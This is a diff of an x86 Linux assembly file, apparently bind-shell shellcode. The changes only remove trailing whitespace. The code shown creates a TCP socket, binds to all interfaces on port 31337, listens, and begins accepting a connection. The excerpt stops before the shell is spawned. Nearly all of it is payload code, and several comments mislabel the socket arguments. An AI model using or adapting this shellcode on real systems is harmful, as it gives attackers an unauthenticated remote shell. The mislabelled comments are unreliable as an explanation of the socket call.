@@ -1,37 +1,37 @@
-global _start                                                                                                                                     
-                                                                                                                                                  
-section .text                                                                                                                                     
-                                                                                                                                                  
-_start:                                                                                                                                           
-                                                                                                                                                 
-socket:                                                                                                                                          
-        xor eax, eax    ; Zeroing out eax                                                                                                        
-        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax                                                                     
-                                                                                                                                                 
-        xor ebx, ebx    ; Zeroing out ebx                                                                                                        
-        mov bl, 0x01    ; Setting the first argument (SYS_SOCKET)                                                                                
-                                                                                                                                                 
-        xor ecx, ecx    ; Zeroing out ecx                                                                                                        
+global _start
+
+section .text
+
+_start:
+
+socket:
+        xor eax, eax    ; Zeroing out eax
+        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax
+
+        xor ebx, ebx    ; Zeroing out ebx
+        mov bl, 0x01    ; Setting the first argument (SYS_SOCKET)
+
+        xor ecx, ecx    ; Zeroing out ecx
 
 
-                                                                                                                                                 
-        push byte 0x06  ; Setting Domain = TCP                                                                                                    
-        push byte 0x01  ; Setting Type = SOCK_STREAM                                                                                             
-        push byte 0x02  ; Setting Protocol = PF_INET                                                                                             
 
-        mov ecx, esp    ; ECX points to the arguments                                                                                            
-        int 0x80                                                                                                                                 
-                                                                                                                                                 
-        xor edi, edi    ; Zeroing out edi                                                                                                        
-        xchg eax, edi   ; Exchanging the values between eax and edi to assign sockfd to edi                                                      
-                                                                                                                                                 
-bind:                                                                                                                                            
-        push eax        ; Setting sin_addr = INADDR_ANY ("Address to accept any incoming messages.")                                             
-                                                                                                                                                 
-        xor ebx, ebx    ; Zeroing out ebx                                                                                                        
-        mov bl, 0x02    ; Setting the first argument (SYS_BIND)                                                                                  
-                                                                                                                                                 
-        push word 0x697A        ; Port 31337 in hex                                                                                          
+        push byte 0x06  ; Setting Domain = TCP
+        push byte 0x01  ; Setting Type = SOCK_STREAM
+        push byte 0x02  ; Setting Protocol = PF_INET
+
+        mov ecx, esp    ; ECX points to the arguments
+        int 0x80
+
+        xor edi, edi    ; Zeroing out edi
+        xchg eax, edi   ; Exchanging the values between eax and edi to assign sockfd to edi
+
+bind:
+        push eax        ; Setting sin_addr = INADDR_ANY ("Address to accept any incoming messages.")
+
+        xor ebx, ebx    ; Zeroing out ebx
+        mov bl, 0x02    ; Setting the first argument (SYS_BIND)
+
+        push word 0x697A        ; Port 31337 in hex
         push word 0x02          ; Setting sin_family = AF_INET
 
         mov ecx, esp    ; ECX points to the arguments
@@ -42,22 +42,22 @@ bind:
         push edi        ; Pushing sockfd to the stack
         mov ecx, esp    ; ECX points to the arguments
 
-        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax                                                                     
+        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax
         int 0x80
 
 listen:
-        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax                                                                     
+        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax
         mov bl, 0x04    ; Setting the first argument to SYS_LISTEN
 
-        push 0x01       ; Pushing the maximum queue size for pending connections (backlog) to the stack                                          
+        push 0x01       ; Pushing the maximum queue size for pending connections (backlog) to the stack
         push edi        ; Pushing sockfd to the stack
 
         mov ecx, esp    ; ecx points to the arguments
         int 0x80
 
 accept:
-        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax                                                                     
-        inc bl          ; Increasing bl by one, to set the second argument to SYS_ACCEPT                                                         
+        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax
+        inc bl          ; Increasing bl by one, to set the second argument to SYS_ACCEPT
 
         push edx        ; Pushing NULL to the stack for addrlen argument
         push edx        ; Pushung NULL to the stack for addr argument
